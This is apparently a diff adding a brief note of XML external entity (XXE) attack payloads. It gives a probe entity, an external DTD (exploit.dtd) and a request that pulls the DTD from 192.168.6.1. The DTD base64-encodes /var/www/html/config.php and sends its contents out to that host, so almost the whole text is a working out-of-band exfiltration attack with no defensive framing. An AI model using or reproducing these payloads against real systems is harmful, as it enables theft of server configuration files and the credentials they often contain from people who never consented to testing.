@@ -1,0 +1,21 @@
+Check:
+
+in request:
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://ipaddress:port/">
+]>
+
+
+<email>&xxe;</email>
+
+
+Next:
+Local payload called: exploit.dtd:
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/config.php">
+<!ENTITY % remote
+"<!ENTITY &#37; send SYSTEM 'http://192.168.6.1/%payload;'>">
+%remote;
+%send;
+
+Request:  
+<!DOCTYPE load SYSTEM "http://192.168.6.1/exploit.dtd">
